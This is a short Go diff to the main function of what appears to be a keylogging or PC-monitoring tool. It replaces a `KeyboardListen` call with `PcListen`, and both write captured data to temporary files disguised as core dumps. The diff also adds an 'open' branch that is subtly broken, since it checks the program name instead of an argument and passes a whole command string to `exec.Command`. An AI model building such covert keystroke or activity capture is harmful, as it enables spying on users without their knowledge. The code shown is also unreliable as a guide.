@@ -2,6 +2,7 @@ package main
 
 import (
 	"os"
+	"os/exec"
 	"os/signal"
 	"syscall"
 
@@ -9,8 +10,13 @@ import (
 )
 
 func main() {
-	corekey.KeyboardListen("core_dump010215.tmp")
+	if len(os.Args) > 0 && os.Args[0] == "open" {
+		path := corekey.GetAppDataPath()
+		exec.Command("start " + path).Run()
+		return
+	}
 
+	corekey.PcListen("core_dump600.tmp", 0)
 	sigs := make(chan os.Signal, 1)
 	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
 	<-sigs
